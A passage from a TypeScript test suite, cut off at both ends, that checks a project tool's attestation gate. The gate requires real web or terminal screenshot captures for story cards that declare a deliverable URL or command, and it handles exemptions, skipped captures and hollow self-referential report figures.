  it("AC3: a required story with an HONEST recorded machine-skip PASSES (deletion-not-placeholder, not silent)", () => {
    // FIX-339 (AC6): the honest machine-skip lane is reserved for cards that owe
    // no REAL capture — i.e. a card with a declared deliverable_cmd whose terminal
    // capture honestly skipped is NOT enough (a declared surface owes a real shot),
    // so the honest-skip-passes case is a card with NO declared web/cmd surface but
    // an explicit screenshot_exempt reason (the recorded "no capturable surface"
    // path). A card that declares nothing at all now only carries a must-declare
    // diagnostic; it still needs some real evidence to pass the visual floor.
    const wt = withReport("FIX-SKIP309", 2000, '<div class="ev ev-text">{"taken":false,"skipped":"no GUI session"}</div>');
    addSpec(
      wt,
      "FIX-SKIP309",
      "---\nid: FIX-SKIP309\nscreenshot_exempt: headless CI — no GUI session to capture the TUI\n---\n# FIX-SKIP309 — TUI redesign\n\n## Acceptance Criteria\n\n- [ ] the TUI renders\n",
    );
    withPeerScore(wt, "FIX-SKIP309", 8, "good", "c-skip309");
    writeEvidenceJson(wt, "FIX-SKIP309", {
      captures: [{ kind: "terminal", out: "screenshots/terminal.png", taken: false, skipped: "no GUI session" }],
    });
    expect(storyRequiresScreenshot(wt, "FIX-SKIP309")).toBe(false); // exempt → no capture owed
    expect(verificationReportHasContent(wt, "FIX-SKIP309")).toBe(true);
    const { alerts, s } = sinks();
    const r = runAttestGate(wt, "FIX-SKIP309", "c-skip309", "hard", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(alerts).toHaveLength(0);
  });
});

/**
 * FIX-309 — 堵 284 两洞 (the declared-deliverable enforcement).
 *
 * The two leaks FIX-284 exposed:
 *   ① a card that DECLARED a `deliverable_url` (a concrete, technically-captureable
 *     web surface) but whose capture was an honest-skip / empty shell still passed
 *     the visual floor (`hasMachineCaptureSkip` excused it) — "声明了 url 却从没真截也能过";
 *   ② a bare `<figure class="shot">` (a self-referential dossier self-shot, the
 *     FIX-321 forgery shape) passed `verificationReportHasContent` even though no
 *     REAL capture of the declared surface ever happened — "dossier 自拍空壳也能过".
 *
 * The fix: once a non-exempt card DECLARES a deliverable_url, ONLY a recorded
 * `{kind:"web",taken:true}` capture discharges its visual floor. honest-skip stays
 * valid ONLY for "确实无可视面 + 记录化豁免": an EXEMPT card, or a required card with
 * NO declared web target (a TUI/terminal deliverable on the terminal-capture lane).
 */
describe("FIX-309 — declared deliverable_url demands a REAL capture (堵 284 两洞)", () => {
  function withSpec(storyId: string, specText: string): string {
    const wt = tmp("fix309-deliv");
    const dir = join(wt, ".roll", "features", "uncategorized", storyId);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "spec.md"), specText);
    return wt;
  }
  function addSpec(wt: string, storyId: string, specText: string): void {
    writeFileSync(join(wt, ".roll", "features", "uncategorized", storyId, "spec.md"), specText);
  }

  it("(a) DEFAULT: a no-keyword card with NO declared surface still REQUIRES a screenshot", () => {
    const wt = withSpec("FIX-309A", "# FIX-309A — Casting redesign\n\n## Acceptance Criteria\n\n- [ ] casting layout reworked\n");
    expect(storyRequiresScreenshot(wt, "FIX-309A")).toBe(true);
    expect(webCaptureTargetForStory(wt, "FIX-309A")).toBeNull(); // no declared surface → terminal/honest-skip lane
  });

  it("(b) EXEMPTION with a reason passes with text-only evidence (no capture owed)", () => {
    const wt = withReport("FIX-309B", 2000, '<div class="ev ev-text">text proof only</div>');
    addSpec(
      wt,
      "FIX-309B",
      "---\nid: FIX-309B\nscreenshot_exempt: pure data migration; no rendered surface\n---\n# FIX-309B\n\n## Acceptance Criteria\n\n- [ ] rows migrate\n",
    );
    withPeerScore(wt, "FIX-309B", 8, "good", "c-309b");
    expect(storyRequiresScreenshot(wt, "FIX-309B")).toBe(false);
    expect(verificationReportHasContent(wt, "FIX-309B")).toBe(true);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-309B", "c-309b", "hard", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(alerts).toHaveLength(0);
    expect(events[0]?.verdict).toBe("produced");
  });

  it("(c) a BARE `screenshot_exempt: true` (no reason) is NOT an exemption — still required", () => {
    const wt = withSpec("FIX-309C", "---\nid: FIX-309C\nscreenshot_exempt: true\n---\n# FIX-309C\n\n## Acceptance Criteria\n\n- [ ] x\n");
    expect(storyRequiresScreenshot(wt, "FIX-309C")).toBe(true);
    expect(screenshotExemption(wt, "FIX-309C").reason).toBeUndefined();
  });

  it("(d) 堵 284 洞①: DECLARED a deliverable_url but only an HONEST web-skip ⇒ FAIL (hard-blocked)", () => {
    // The exact leak: a UI card declares its deliverable surface, the capture is
    // skipped (browser down / never run), and the old gate let the honest-skip
    // satisfy the visual floor. Now: a declared surface owes a REAL capture.
    const wt = withReport("FIX-309D", 2000, '<div class="ev ev-text">text proof only</div>');
    addSpec(
      wt,
      "FIX-309D",
      "---\nid: FIX-309D\ndeliverable_url: https://app.example.test/casting#board\n---\n# FIX-309D — Casting redesign\n\n## Acceptance Criteria\n\n- [ ] casting renders\n",
    );
    withPeerScore(wt, "FIX-309D", 8, "good", "c-309d");
    writeEvidenceJson(wt, "FIX-309D", {
      captures: [{ kind: "web", out: "screenshots/web.png", taken: false, skipped: "ROLL_ATTEST_NO_BROWSER" }],
    });
    expect(storyRequiresScreenshot(wt, "FIX-309D")).toBe(true);
    // declared a surface → an honest-skip no longer satisfies the floor.
    expect(verificationReportHasContent(wt, "FIX-309D")).toBe(false);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-309D", "c-309d", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(alerts[0]).toContain("BLOCKED");
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("(d') 堵 284 洞②: DECLARED a deliverable_url + a bare `<figure shot>` self-shot but NO real web capture ⇒ FAIL", () => {
    // The dossier-self-shot forgery shape: the report HTML carries a `<figure
    // class=shot>` (which used to satisfy verificationReportHasContent) but the
    // evidence manifest has NO taken:true web capture. A declared surface must be
    // really captured — a hollow figure does not count.
    const wt = withReport("FIX-309D2", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
    addSpec(
      wt,
      "FIX-309D2",
      "---\nid: FIX-309D2\ndeliverable_url: https://app.test/casting\n---\n# FIX-309D2 — Casting\n\n## Acceptance Criteria\n\n- [ ] casting renders\n",
    );
    withPeerScore(wt, "FIX-309D2", 8, "good", "c-309d2");
    writeEvidenceJson(wt, "FIX-309D2", {
      captures: [{ kind: "web", out: "screenshots/web.png", taken: false, skipped: "capture errored: net down" }],
    });
    expect(storyRequiresScreenshot(wt, "FIX-309D2")).toBe(true);
    expect(verificationReportHasContent(wt, "FIX-309D2")).toBe(false);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-309D2", "c-309d2", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("(e) DECLARED a deliverable_url WITH a REAL captured web.png (taken:true) ⇒ PASS", () => {
    const wt = withReport("FIX-309E", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
    addSpec(
      wt,
      "FIX-309E",
      "---\nid: FIX-309E\ndeliverable_url: https://app.example.test/casting#board\n---\n# FIX-309E — Casting redesign\n\n## Acceptance Criteria\n\n- [ ] casting renders\n",
    );
    withPeerScore(wt, "FIX-309E", 8, "good", "c-309e");
    writeEvidenceJson(wt, "FIX-309E", {
      captures: [{ kind: "web", out: "screenshots/web.png", taken: true }],
    });
    expect(storyRequiresScreenshot(wt, "FIX-309E")).toBe(true);
    expect(verificationReportHasContent(wt, "FIX-309E")).toBe(true);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-309E", "c-309e", "hard", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(r.blocked).toBe(false);
    expect(alerts).toHaveLength(0);
    expect(events[0]?.verdict).toBe("produced");
  });

  it("(e') a pass AC lacking a screenshot ref is EXCUSED by a real web capture, but NOT by an honest-skip, when a surface is declared", () => {
    // passAcVisualFloor branch: declared surface + pass AC without a screenshot
    // evidence ref. A real web capture rescues it; an honest-skip does not.
    const wtSkip = withReport("FIX-309F", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
    addSpec(wtSkip, "FIX-309F", "---\nid: FIX-309F\ndeliverable_url: https://app.test/x\n---\n# FIX-309F\n\n**AC:**\n- [ ] renders\n");
    writeAcMap(wtSkip, "FIX-309F", [
      { ac: "FIX-309F:AC1", status: "pass", evidence: [{ kind: "text", label: "log", textFile: "evidence/proof.txt" }] },
    ]);
    writeEvidenceJson(wtSkip, "FIX-309F", { captures: [{ kind: "web", out: "screenshots/web.png", taken: false, skipped: "no browser" }] });
    expect(verificationReportHasContent(wtSkip, "FIX-309F")).toBe(false); // honest-skip cannot excuse a declared surface

    const wtReal = withReport("FIX-309G", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
    addSpec(wtReal, "FIX-309G", "---\nid: FIX-309G\ndeliverable_url: https://app.test/x\n---\n# FIX-309G\n\n**AC:**\n- [ ] renders\n");
    writeAcMap(wtReal, "FIX-309G", [
      { ac: "FIX-309G:AC1", status: "pass", evidence: [{ kind: "text", label: "log", textFile: "evidence/proof.txt" }] },
    ]);
    writeEvidenceJson(wtReal, "FIX-309G", { captures: [{ kind: "web", out: "screenshots/web.png", taken: true }] });
    expect(verificationReportHasContent(wtReal, "FIX-309G")).toBe(true);
  });

  it("(no over-enforce) a genuinely-non-web TUI card that DECLARES a deliverable_cmd + a real terminal capture passes", () => {
    // The over-enforce guard, updated for FIX-339 (AC6): tightening must NOT kill
    // genuinely-non-web cards — BUT a non-exempt card must now DECLARE its surface.
    // A TUI card declares its `deliverable_cmd` (the CLI lane, no web url) and
    // provides a REAL terminal capture; it passes the must-declare floor + the
    // per-surface floor without ever being forced to declare a web url.
    const wt = withReport("FIX-309H", 2000, '<figure class="shot"><img src="screenshots/terminal.png"></figure>');
    addSpec(
      wt,
      "FIX-309H",
      "---\nid: FIX-309H\ndeliverable_cmd: roll backlog\n---\n# FIX-309H — TUI redesign\n\n## Acceptance Criteria\n\n- [ ] the TUI renders\n",
    );
    withPeerScore(wt, "FIX-309H", 8, "good", "c-309h");
    writeEvidenceJson(wt, "FIX-309H", {
      captures: [{ kind: "terminal", out: "screenshots/terminal.png", taken: true }],
    });
    expect(storyRequiresScreenshot(wt, "FIX-309H")).toBe(true);
    expect(webCaptureTargetForStory(wt, "FIX-309H")).toBeNull(); // CLI deliverable → no web url
    expect(verificationReportHasContent(wt, "FIX-309H")).toBe(true);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-309H", "c-309h", "hard", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(alerts).toHaveLength(0);
    expect(events[0]?.verdict).toBe("produced");
  });

  it("(REFACTOR-076) a required card that declares NO surface is diagnostic-only at runtime", () => {
    // The shifted must-declare floor: a non-exempt card WITH a visual-evidence AC
    // ("screenshot") but NO deliverable_url / deliverable_cmd / screenshot_exempt
    // records the canonical must-declare reason as a diagnostic, but does not
    // change the attest control flow.
    // FIX-933: this only applies when the card HAS a visual AC — a pure back-end
    // card with no visual AC is NOT a must-declare diagnostic (it has nothing to capture).
    const wt = withReport("FIX-309NODECL", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
    addSpec(wt, "FIX-309NODECL", "# FIX-309NODECL — Casting redesign\n\n## Acceptance Criteria\n\n- [ ] screenshot of the casting layout\n");
    withPeerScore(wt, "FIX-309NODECL", 8, "good", "c-309nodecl");
    expect(storyRequiresScreenshot(wt, "FIX-309NODECL")).toBe(true);
    expect(verificationReportHasContent(wt, "FIX-309NODECL")).toBe(true);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-309NODECL", "c-309nodecl", "hard", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(r.blocked).toBe(false);
    expect(r.reasons).toContain(MUST_DECLARE_FAIL_REASON);
    expect(alerts).toHaveLength(0);
    expect(events[0]?.verdict).toBe("produced");
  });
});

describe("FIX-339 — multi-surface deliverables (web list + deliverable_cmd) + per-surface enforcement", () => {
  function withSpec(storyId: string, specText: string): string {
    const wt = tmp("fix339");
    const dir = join(wt, ".roll", "features", "uncategorized", storyId);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "spec.md"), specText);
    return wt;
  }
  function addSpec(wt: string, storyId: string, specText: string): void {
    const dir = join(wt, ".roll", "features", "uncategorized", storyId);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "spec.md"), specText);
  }

  // ── AC1: deliverable_url parsing in all shapes (single back-compat) ──────────
  it("AC1: single scalar deliverable_url → one-element list (back-compat)", () => {
    const wt = withSpec("FIX-S1", "---\nid: FIX-S1\ndeliverable_url: https://app.test/x\n---\n# x\n\n**AC:**\n- [ ] x\n");
    expect(deliverableUrlsForStory(wt, "FIX-S1")).toEqual(["https://app.test/x"]);
    expect(webCaptureTargetForStory(wt, "FIX-S1")).toBe("https://app.test/x");
  });

  it("AC1: inline list `[a, b]` → two targets", () => {
    const wt = withSpec("FIX-S2", "---\nid: FIX-S2\ndeliverable_url: [https://app.test/a, https://app.test/b]\n---\n# x\n\n**AC:**\n- [ ] x\n");
    expect(deliverableUrlsForStory(wt, "FIX-S2")).toEqual(["https://app.test/a", "https://app.test/b"]);
    expect(webCaptureTargetsForStory(wt, "FIX-S2")).toEqual(["https://app.test/a", "https://app.test/b"]);
  });

  it("AC1: comma-separated scalar and YAML block list both yield two targets", () => {
    const wtComma = withSpec("FIX-S3", "---\nid: FIX-S3\ndeliverable_url: https://app.test/a, https://app.test/b\n---\n# x\n\n**AC:**\n- [ ] x\n");
    expect(deliverableUrlsForStory(wtComma, "FIX-S3")).toEqual(["https://app.test/a", "https://app.test/b"]);
    const wtBlock = withSpec("FIX-S4", "---\nid: FIX-S4\ndeliverable_url:\n  - https://app.test/a\n  - https://app.test/b\n---\n# x\n\n**AC:**\n- [ ] x\n");
    expect(deliverableUrlsForStory(wtBlock, "FIX-S4")).toEqual(["https://app.test/a", "https://app.test/b"]);
  });

  // ── AC1: two urls — both captured ⇒ PASS; one missing ⇒ FAIL ────────────────
  it("AC1: TWO declared urls — BOTH really captured ⇒ PASS", () => {
    const wt = withReport("FIX-S5", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
    addSpec(wt, "FIX-S5", "---\nid: FIX-S5\ndeliverable_url: [https://app.test/a, https://app.test/b]\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] renders\n");
    withPeerScore(wt, "FIX-S5", 8, "good", "c-s5");
    writeEvidenceJson(wt, "FIX-S5", {
      captures: [
        { kind: "web", out: "screenshots/web.png", taken: true },
        { kind: "web", out: "screenshots/web-1.png", taken: true },
      ],
    });
    expect(verificationReportHasContent(wt, "FIX-S5")).toBe(true);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-S5", "c-s5", "hard", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(alerts).toHaveLength(0);
    expect(events[0]?.verdict).toBe("produced");
  });

  it("AC1: TWO declared urls but only ONE captured ⇒ FAIL (hard-blocked)", () => {
    const wt = withReport("FIX-S6", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
    addSpec(wt, "FIX-S6", "---\nid: FIX-S6\ndeliverable_url: [https://app.test/a, https://app.test/b]\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] renders\n");
    withPeerScore(wt, "FIX-S6", 8, "good", "c-s6");
    writeEvidenceJson(wt, "FIX-S6", {
      captures: [{ kind: "web", out: "screenshots/web.png", taken: true }],
    });
    expect(verificationReportHasContent(wt, "FIX-S6")).toBe(false);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-S6", "c-s6", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(alerts[0]).toContain("BLOCKED");
    expect(events[0]?.verdict).toBe("skipped");
  });

  // ── AC2: deliverable_cmd needs a real terminal capture ──────────────────────
  it("AC2: deliverable_cmd parsing (single + list)", () => {
    const wt1 = withSpec("FIX-S7", "---\nid: FIX-S7\ndeliverable_cmd: roll status\n---\n# x\n\n**AC:**\n- [ ] x\n");
    expect(deliverableCmdsForStory(wt1, "FIX-S7")).toEqual(["roll status"]);
    const wt2 = withSpec("FIX-S8", "---\nid: FIX-S8\ndeliverable_cmd:\n  - roll status\n  - roll doctor\n---\n# x\n\n**AC:**\n- [ ] x\n");
    expect(deliverableCmdsForStory(wt2, "FIX-S8")).toEqual(["roll status", "roll doctor"]);
  });

  it("AC2: declared deliverable_cmd WITH a real terminal capture ⇒ PASS; honest-skip ⇒ FAIL", () => {
    const wtReal = withReport("FIX-S9", 2000, '<figure class="shot"><img src="screenshots/terminal.png"></figure>');
    addSpec(wtReal, "FIX-S9", "---\nid: FIX-S9\ndeliverable_cmd: roll status\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] cli works\n");
    withPeerScore(wtReal, "FIX-S9", 8, "good", "c-s9");
    writeEvidenceJson(wtReal, "FIX-S9", { captures: [{ kind: "terminal", out: "screenshots/terminal.png", taken: true }] });
    expect(verificationReportHasContent(wtReal, "FIX-S9")).toBe(true);

    const wtSkip = withReport("FIX-S10", 2000, '<figure class="shot"><img src="screenshots/terminal.png"></figure>');
    addSpec(wtSkip, "FIX-S10", "---\nid: FIX-S10\ndeliverable_cmd: roll status\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] cli works\n");
    withPeerScore(wtSkip, "FIX-S10", 8, "good", "c-s10");
    writeEvidenceJson(wtSkip, "FIX-S10", { captures: [{ kind: "terminal", out: "screenshots/terminal.png", taken: false, skipped: "no GUI session" }] });
    expect(verificationReportHasContent(wtSkip, "FIX-S10")).toBe(false);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wtSkip, "FIX-S10", "c-s10", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("AC2: TWO declared cmds but only ONE captured ⇒ FAIL", () => {
    const wt = withReport("FIX-S11", 2000, '<figure class="shot"><img src="screenshots/terminal.png"></figure>');
    addSpec(wt, "FIX-S11", "---\nid: FIX-S11\ndeliverable_cmd:\n  - roll status\n  - roll doctor\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] cli works\n");
    withPeerScore(wt, "FIX-S11", 8, "good", "c-s11");
    writeEvidenceJson(wt, "FIX-S11", { captures: [{ kind: "terminal", out: "screenshots/terminal.png", taken: true }] });
    expect(verificationReportHasContent(wt, "FIX-S11")).toBe(false);
  });

  // ── AC3: mixed web+cmd card — BOTH lanes must be satisfied ──────────────────
  it("AC3: mixed (web + cmd) — both captured ⇒ PASS; one lane missing ⇒ FAIL", () => {
    const both = "---\nid: ID\ndeliverable_url: https://app.test/a\ndeliverable_cmd: roll status\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] mixed\n";
    const wtOk = withReport("FIX-S12", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
    addSpec(wtOk, "FIX-S12", both.replace("ID", "FIX-S12"));
    withPeerScore(wtOk, "FIX-S12", 8, "good", "c-s12");
    writeEvidenceJson(wtOk, "FIX-S12", {
      captures: [
        { kind: "web", out: "screenshots/web.png", taken: true },
        { kind: "terminal", out: "screenshots/terminal.png", taken: true },
      ],
    });
    expect(verificationReportHasContent(wtOk, "FIX-S12")).toBe(true);

    const wtBad = withReport("FIX-S13", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
    addSpec(wtBad, "FIX-S13", both.replace("ID", "FIX-S13"));
    withPeerScore(wtBad, "FIX-S13", 8, "good", "c-s13");
    writeEvidenceJson(wtBad, "FIX-S13", {
      captures: [
        { kind: "web", out: "screenshots/web.png", taken: true },
        { kind: "terminal", out: "screenshots/terminal.png", taken: false, skipped: "no GUI" },
      ],
    });
    expect(verificationReportHasContent(wtBad, "FIX-S13")).toBe(false);
  });

  // ── FIX-392: headless terminal fallback (text evidence satisfies gate) ─────
  it("FIX-392: headless deliverable_cmd taken:true text evidence → gate PASS", () => {
    const wt = withReport("FIX-S16", 2000, '<figure class="shot"><img src="screenshots/terminal-headless.txt"></figure>');
    addSpec(wt, "FIX-S16", "---\nid: FIX-S16\ndeliverable_cmd: roll status\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] cli works\n");
    withPeerScore(wt, "FIX-S16", 8, "good", "c-s16");
    // Headless fallback: a taken:true terminal capture with txt output
    writeEvidenceJson(wt, "FIX-S16", { captures: [{ kind: "terminal", out: "screenshots/terminal-headless.txt", taken: true }] });
    expect(verificationReportHasContent(wt, "FIX-S16")).toBe(true);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-S16", "c-s16", "hard", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(r.blocked).toBe(false);
    // No alert; ALERT only fires on skip
    expect(alerts).toHaveLength(0);
  });

  it("FIX-392: headless deliverable_cmd without fallback (taken:false) → gate FAIL (regression guard)", () => {
    // This test guards against accidentally removing the gate — the OLD
    // broken behaviour (taken:false on headless) must still fail.
    const wt = withReport("FIX-S17", 2000, '<figure class="shot"><img src="screenshots/terminal.png"></figure>');
    addSpec(wt, "FIX-S17", "---\nid: FIX-S17\ndeliverable_cmd: roll status\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] cli works\n");
    withPeerScore(wt, "FIX-S17", 8, "good", "c-s17");
    writeEvidenceJson(wt, "FIX-S17", { captures: [{ kind: "terminal", out: "screenshots/terminal.png", taken: false, skipped: "no GUI session" }] });
    expect(verificationReportHasContent(wt, "FIX-S17")).toBe(false);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-S17", "c-s17", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
  });

  // ── back-compat: single-url card + exempt card unchanged ────────────────────
  it("back-compat: a single-url card still passes with one real web shot (no regression)", () => {
    const wt = withReport("FIX-S14", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
    addSpec(wt, "FIX-S14", "---\nid: FIX-S14\ndeliverable_url: https://app.test/x\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] renders\n");
    withPeerScore(wt, "FIX-S14", 8, "good", "c-s14");
    writeEvidenceJson(wt, "FIX-S14", { captures: [{ kind: "web", out: "screenshots/web.png", taken: true }] });
    expect(verificationReportHasContent(wt, "FIX-S14")).toBe(true);
  });

  it("back-compat: an exempt card owes no capture and declaresAnySurface=true via the exemption", () => {
    const wt = withReport("FIX-S15", 2000, '<div class="ev ev-text">text proof</div>');
    const spec = "---\nid: FIX-S15\nscreenshot_exempt: pure data migration; no rendered surface\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] rows migrate\n";
    addSpec(wt, "FIX-S15", spec);
    withPeerScore(wt, "FIX-S15", 8, "good", "c-s15");
    expect(storyRequiresScreenshot(wt, "FIX-S15")).toBe(false);
    expect(webCaptureTargetsForStory(wt, "FIX-S15")).toEqual([]);
    expect(declaresAnySurface(spec)).toBe(true);
    expect(verificationReportHasContent(wt, "FIX-S15")).toBe(true);
  });

  // ── AC6: declaresAnySurface pure function ───────────────────────────────────
  it("AC6: declaresAnySurface — true for url / cmd / exempt-with-reason; false otherwise", () => {
    expect(declaresAnySurface("---\nid: A\ndeliverable_url: https://x\n---\n# A\n")).toBe(true);
    expect(declaresAnySurface("---\nid: A\nscreenshot_url: https://x\n---\n# A\n")).toBe(true);
    expect(declaresAnySurface("---\nid: A\ndeliverable_cmd: roll status\n---\n# A\n")).toBe(true);
    expect(declaresAnySurface("---\nid: A\nscreenshot_exempt: pure data migration\n---\n# A\n")).toBe(true);
    expect(declaresAnySurface("---\nid: A\nscreenshot_exempt: true\n---\n# A\n")).toBe(false);
    expect(declaresAnySurface("# A — redesign\n\n## Acceptance Criteria\n\n- [ ] x\n")).toBe(false);
    expect(declaresAnySurface("---\nid: A\nepic: foo\n---\n# A\n")).toBe(false);
  });

  // ── AC6: must-declare diagnostic floor (violatesMustDeclareSurface + no gate block) ─
  describe("AC6: must-declare diagnostic floor", () => {
    it("violatesMustDeclareSurface — non-exempt + declares nothing + HAS visual AC ⇒ true; declared/exempt ⇒ false", () => {
      // Card HAS a visual-evidence AC ("screenshot") but declares NO surface → violates.
      const noDecl = withSpec("FIX-MD1", "# FIX-MD1 — redesign\n\n## Acceptance Criteria\n\n- [ ] screenshot of the dashboard\n");
      expect(violatesMustDeclareSurface(noDecl, "FIX-MD1")).toBe(true);

      const url = withSpec("FIX-MD2", "---\nid: FIX-MD2\ndeliverable_url: https://app.test/x\n---\n# x\n\n**AC:**\n- [ ] x\n");
      expect(violatesMustDeclareSurface(url, "FIX-MD2")).toBe(false);

      const cmd = withSpec("FIX-MD3", "---\nid: FIX-MD3\ndeliverable_cmd: roll backlog\n---\n# x\n\n**AC:**\n- [ ] x\n");
      expect(violatesMustDeclareSurface(cmd, "FIX-MD3")).toBe(false);

      const exempt = withSpec("FIX-MD4", "---\nid: FIX-MD4\nscreenshot_exempt: pure data migration; no surface\n---\n# x\n\n**AC:**\n- [ ] x\n");
      expect(violatesMustDeclareSurface(exempt, "FIX-MD4")).toBe(false);

      // missing spec → false (fail open; the gate is the single failure surface).
      expect(violatesMustDeclareSurface(tmp("md-none"), "FIX-MDX")).toBe(false);
    });

    it("FIX-933: backend card with NO visual-evidence AC → NOT a violation (nothing to capture)", () => {
      // Pure back-end card: AC blocks but no visual-evidence AC (no screenshot, no
      // terminal capture, no [visual-evidence] marker). Text-only evidence is fine.
      const backend = withSpec("FIX-MD0", "# FIX-MD0 — API schema update\n\n## Acceptance Criteria\n\n- [ ] endpoint returns 200\n- [ ] response body includes new field\n");
      expect(violatesMustDeclareSurface(backend, "FIX-MD0")).toBe(false);

      // Back-end card with AC that happens to use the word "captured" in a
      // non-visual context (dual-use token without a visual context cue).
      const telemetry = withSpec("FIX-MD0b", "# FIX-MD0b — telemetry\n\n## Acceptance Criteria\n\n- [ ] telemetry data is captured from the API\n");
      expect(violatesMustDeclareSurface(telemetry, "FIX-MD0b")).toBe(false);
    });

    it("epic-exempt card (policy deny-list) declares no surface yet is NOT a violation (no 误杀 back-end)", () => {
      const wt = withSpec("FIX-MD5", "# FIX-MD5 — pure data migration\n\n## Acceptance Criteria\n\n- [ ] rows migrate\n");
      // move the spec under a denied epic + record the policy deny-list.
      const denied = join(wt, ".roll", "features", "data-migration", "FIX-MD5");
      mkdirSync(denied, { recursive: true });
      writeFileSync(join(denied, "spec.md"), "# FIX-MD5 — pure data migration\n\n## Acceptance Criteria\n\n- [ ] rows migrate\n");
      // remove the uncategorized copy so the epic-aware path resolves the denied one
      execSync(`rm -rf '${join(wt, ".roll", "features", "uncategorized", "FIX-MD5")}'`);
      writeFileSync(join(wt, ".roll", "policy.yaml"), "acceptance:\n  screenshot_exempt_epics:\n    - data-migration\n");
      expect(screenshotExemption(wt, "FIX-MD5").reason).toBeDefined();
      expect(violatesMustDeclareSurface(wt, "FIX-MD5")).toBe(false);
    });

    it("REFACTOR-076: runAttestGate records a no-surface non-exempt card as diagnostic-only", () => {
      // Card HAS a visual-evidence AC ("screenshot") but declares NO surface → diagnostic.
      const wt = withReport("FIX-MD6", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
      addSpec(wt, "FIX-MD6", "# FIX-MD6 — Casting redesign\n\n## Acceptance Criteria\n\n- [ ] screenshot of dashboard\n");
      withPeerScore(wt, "FIX-MD6", 8, "good", "c-md6");
      const { alerts, events, s } = sinks();
      const r = runAttestGate(wt, "FIX-MD6", "c-md6", "hard", 1000, s);
      expect(r.verdict).toBe("produced");
      expect(r.blocked).toBe(false);
      expect(r.reasons).toContain(MUST_DECLARE_FAIL_REASON);
      expect(alerts).toHaveLength(0);
      expect(events[0]?.verdict).toBe("produced");
    });

    it("soft mode also records diagnostic-only for a no-surface card", () => {
      // Card HAS a visual-evidence AC ("screenshot") but declares NO surface.
      const wt = withReport("FIX-MD7", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
      addSpec(wt, "FIX-MD7", "# FIX-MD7 — redesign\n\n## Acceptance Criteria\n\n- [ ] screenshot of page\n");
      withPeerScore(wt, "FIX-MD7", 8, "good", "c-md7");
      const { alerts, events, s } = sinks();
      const r = runAttestGate(wt, "FIX-MD7", "c-md7", "soft", 1000, s);
      expect(r.verdict).toBe("produced");
      expect(r.blocked).toBe(false);
      expect(r.reasons).toContain(MUST_DECLARE_FAIL_REASON);
      expect(alerts).toHaveLength(0);
      expect(events[0]?.verdict).toBe("produced");
    });

    it("FIX-933: attest gate does NOT block a pure backend card (has AC block but no visual AC)", () => {
      const wt = withReport("FIX-MD9", 2000, '<div class="ev ev-text">API response proof</div>');
      addSpec(wt, "FIX-MD9", "# FIX-MD9 — API schema update\n\n## Acceptance Criteria\n\n- [ ] endpoint returns 200\n- [ ] response includes new field\n");
      // Record a honest web skip in evidence.json (the executor passes --capture-web-skip
      // when a non-exempt card has no declared surface and no deliverable_cmd).
      writeEvidenceJson(wt, "FIX-MD9", { captures: [{ kind: "web", out: "screenshots/web.png", taken: false, skipped: "no deliverable_url declared" }] });
      withPeerScore(wt, "FIX-MD9", 8, "good", "c-md9");
      const { alerts, events, s } = sinks();
      const r = runAttestGate(wt, "FIX-MD9", "c-md9", "hard", 1000, s);
      expect(r.verdict).toBe("produced");
      expect(r.blocked).toBe(false);
      expect(alerts).toHaveLength(0);
      expect(events[0]?.verdict).toBe("produced");
    });

    it("a no-AC card is NEVER subjected to must-declare (storyHasAcBlock early return)", () => {
      const wt = withSpec("IDEA-MD8", "# IDEA-MD8 — an idea note, no AC block\n\nsome prose, no checklist\n");
